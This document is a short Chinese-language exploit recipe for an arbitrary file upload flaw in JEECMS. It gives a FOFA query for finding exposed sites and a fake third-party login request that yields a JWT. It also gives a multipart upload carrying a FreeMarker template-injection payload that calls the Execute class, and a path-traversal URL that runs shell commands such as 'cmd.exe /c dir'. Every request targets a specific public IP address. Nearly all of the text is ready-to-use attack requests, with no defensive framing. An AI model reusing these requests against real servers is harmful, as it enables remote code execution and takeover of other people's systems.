# JEECMS o_upload 任意文件上传

    https://forum.butian.net/share/158

## fofa

```
app="JEECMS"
```

## 任意文件上传

### 登录获取jwt

```
POST /thirdParty/bind HTTP/1.1
Host: 60.221.255.224
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 75

{"username":"7A2AE2","loginWay": 1, "loginType": "QQ", "thirdId": "7A2AE2"}
```

### 上传html

```
POST /member/upload/o_upload HTTP/1.1
Host: 60.221.255.224
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=---------------------------1250178961143214655620108952
Jeecms-Auth-Token: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI3QTJBRTIiLCJjcmVhdGVkIjoxNjgwMDc2NjYwMDcxLCJ1c2VyU291cmNlIjoiYWRtaW4iLCJleHAiOjE2ODAwNzc4NjB9.TeYSmvg7T_I4tcsp5OquCrk8ggmwkrttoZ7-3yWFpUmOctZSDoRipEddc8JsxJkH2M85Xf71oTGPZ_X5u5m5Aw
Accept-Encoding: gzip
Content-Length: 602

-----------------------------1250178961143214655620108952
Content-Disposition: form-data; name="uploadFile"; filename="a.html"
Content-Type: text/html

${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
-----------------------------1250178961143214655620108952
Content-Disposition: form-data; name="typeStr"

File
-----------------------------1250178961143214655620108952--
```

### 拼接路径

```
https://60.221.255.224/..-..-..-..-..-u-cms-www-202303-2915574001x5.htm?cmd=cmd.exe%20/c%20dir,ls
```
